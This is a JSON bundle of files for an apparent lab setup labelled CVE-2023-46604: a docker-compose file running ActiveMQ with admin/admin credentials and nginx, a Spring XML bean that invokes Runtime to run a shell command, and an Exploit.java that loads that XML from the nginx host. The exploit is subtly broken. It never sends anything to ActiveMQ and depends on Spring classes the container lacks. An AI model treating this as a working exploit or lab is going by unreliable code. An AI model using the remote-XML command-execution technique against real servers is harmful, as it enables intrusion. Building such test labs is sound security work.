{
    "files": [
        {
            "location": "./../../dockers/CVE-2023-46604/custom_no_tool/docker-compose.yml",
            "content": "services:\n  activemq:\n    image: rmohr/activemq:5.15.15\n    container_name: activemq\n    ports:\n      - \"61616:61616\"  # OpenWire port\n      - \"8161:8161\"    # Web Console\n    environment:\n      ACTIVEMQ_ADMIN_LOGIN: admin\n      ACTIVEMQ_ADMIN_PASSWORD: admin\n\n  nginx:\n    image: nginx:1.21.6\n    container_name: nginx\n    ports:\n      - \"8080:80\"  # HTTP port\n    volumes:\n      - ./nginx/html:/usr/share/nginx/html\n\n  openjdk:\n    image: openjdk:8-jdk-slim\n    container_name: openjdk\n    volumes:\n      - ./malicious:/app\n    command: [\"sh\", \"-c\", \"cd /app && javac Exploit.java && java Exploit\"]\n    depends_on:\n      - activemq\n      - nginx\n    networks:\n      - default\n\nnetworks:\n  default:\n    driver: bridge\n"
        },
        {
            "location": "./../../dockers/CVE-2023-46604/custom_no_tool/nginx/html/malicious.xml",
            "content": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans\n       http://www.springframework.org/schema/beans/spring-beans.xsd\">\n\n    <bean id=\"exploitBean\" class=\"java.lang.Runtime\" factory-method=\"getRuntime\">\n        <constructor-arg>\n            <value>touch /tmp/exploit_success</value>\n        </constructor-arg>\n    </bean>\n\n</beans>\n"
        },
        {
            "location": "./../../dockers/CVE-2023-46604/custom_no_tool/malicious/Exploit.java",
            "content": "import org.springframework.context.support.ClassPathXmlApplicationContext;\n\npublic class Exploit {\n    public static void main(String[] args) {\n        new ClassPathXmlApplicationContext(\"http://nginx:80/malicious.xml\");\n    }\n}\n"
        }
    ],
    "directory_tree": "CVE-2023-46604/\n\u2514\u2500\u2500 custom_no_tool/\n    \u251c\u2500\u2500 docker-compose.yml\n    \u251c\u2500\u2500 nginx/\n    \u2502   \u2514\u2500\u2500 html/\n    \u2502       \u2514\u2500\u2500 malicious.xml\n    \u2514\u2500\u2500 malicious/\n        \u2514\u2500\u2500 Exploit.java\n"
}